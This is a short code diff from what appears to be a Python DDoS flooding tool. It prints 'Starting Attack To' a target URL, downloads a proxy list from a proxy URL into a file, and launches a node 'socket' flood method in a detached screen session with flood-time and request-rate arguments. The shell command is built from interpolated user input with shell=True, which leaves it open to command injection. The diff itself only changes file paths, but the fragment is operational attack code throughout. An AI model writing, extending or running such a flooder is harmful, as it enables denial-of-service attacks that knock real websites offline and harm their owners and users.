@@ -73,9 +73,9 @@ class Home:
 						print (f"{Color.LR}Starting Attack To ➠ {Color.LR}" + url)
 						print (f"{Color.LY}Starting Attack To ➠ {Color.LY}" + url)
 						time.sleep(0.01)
-					with open("vdh/http.txt", 'w') as p:
+					with open("http.txt", 'w') as p:
 						p.write(httpx.get(http_proxy).text)
-					subprocess.run([f'screen -dm node vdh/Method/socket {url} vdh/http.txt {floodtime} {reqs}'], shell=True)
+					subprocess.run([f'screen -dm node Method/socket {url} http.txt {floodtime} {reqs}'], shell=True)
 				except:
 					print(f"{Color.LR}ERROR: {Color.RESET}Try again")
 			elif option == '02' or option == '2':
